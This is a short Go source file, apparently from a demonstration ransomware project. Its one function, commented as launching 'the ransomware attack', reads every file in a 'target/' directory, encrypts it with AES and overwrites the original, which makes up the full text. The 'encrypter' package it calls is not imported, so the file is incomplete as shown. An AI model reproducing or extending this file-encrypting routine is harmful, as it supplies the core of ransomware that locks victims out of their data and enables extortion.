package main

import (
	"io/ioutil"
)

// Attack launches the ransomware attack.
func Attack() error {
	files, err := ioutil.ReadDir("target/")
	if err != nil {
		return err
	}

	for _, file := range files {
		input, err := ioutil.ReadFile("target/" + file.Name())
		if err != nil {
			return err
		}

		ciphertext, err := encrypter.EncryptAES(input)
		if err != nil {
			return err
		}

		err = ioutil.WriteFile("target/"+file.Name(), ciphertext, 0644)
		if err != nil {
			return err
		}
	}

	return nil
}
